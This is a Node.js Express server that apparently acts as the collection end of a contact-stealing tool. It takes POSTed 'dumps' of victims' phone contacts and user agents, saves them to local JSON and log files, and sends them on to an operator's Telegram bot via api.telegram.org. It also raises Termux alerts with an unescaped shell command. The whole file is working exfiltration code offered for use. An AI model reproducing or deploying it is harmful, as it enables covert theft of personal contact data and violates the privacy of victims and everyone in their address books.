const express = require('express');
const fs = require('fs');
const axios = require('axios');
const FormData = require('form-data');
const app = express();
app.use(express.json());

// ===== CONFIG =====
const BOT_TOKEN = 'YOUR_BOT_TOKEN';   // BotFather se lo
const CHAT_ID = 'YOUR_CHAT_ID';       // @userinfobot se lo
const LOG_FILE = 'all_dumps.txt';

// ===== TERMUX NOTIFICATION =====
function notifyTermux(msg) {
    try {
        const { exec } = require('child_process');
        exec(`termux-notification --title "📥 New Dump" --content "${msg}" --priority high`);
    } catch (e) {}
}

// ===== TELEGRAM SEND =====
async function sendToTelegram(data) {
    const msg = `📥 *New Dump*\n🕒 ${data.timestamp}\n📱 ${data.userAgent}\n👤 Contacts: ${data.contacts.length}\n\n` +
        data.contacts.map((c, i) => `${i+1}. ${c.name||'?'} — ${c.phone||'?'}`).join('\n');

    if (data.contacts.length > 20) {
        const f = `dump_${Date.now()}.json`;
        fs.writeFileSync(f, JSON.stringify(data, null, 2));
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('document', fs.createReadStream(f));
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, { headers: form.getHeaders() });
        fs.unlinkSync(f);
    } else {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: msg,
            parse_mode: 'Markdown'
        });
    }
}

// ===== DUMP ENDPOINT =====
app.post('/dump', async (req, res) => {
    try {
        const data = req.body;

        // ---- Terminal log ----
        console.log('\n🔥 DUMP RECEIVED 🔥');
        console.log('📅 Time:', data.timestamp);
        console.log('📱 User-Agent:', data.userAgent);
        console.log('👤 Contacts:', data.contacts.length);
        data.contacts.forEach((c, i) => {
            console.log(`  ${i+1}. ${c.name||'?'} — ${c.phone||'?'}`);
        });
        console.log('━'.repeat(50));

        // ---- Save JSON ----
        fs.writeFileSync(`dump_${Date.now()}.json`, JSON.stringify(data, null, 2));

        // ---- Append to text log ----
        const logEntry = `\n[${data.timestamp}] ${data.contacts.length} contacts\n` +
            data.contacts.map(c => `  ${c.name||'?'} — ${c.phone||'?'}`).join('\n') + '\n';
        fs.appendFileSync(LOG_FILE, logEntry);

        // ---- Telegram forward ----
        await sendToTelegram(data);

        // ---- Termux notification ----
        notifyTermux(`${data.contacts.length} contacts received`);

        res.json({ status: 'ok', message: 'Dumped successfully' });

    } catch (e) {
        console.error('❌ Error:', e.message);
        res.status(500).json({ error: e.message });
    }
});

// ===== START SERVER =====
app.listen(3000, () => {
    console.log('✅ Server running on port 3000');
    console.log('📡 Waiting for dumps...');
});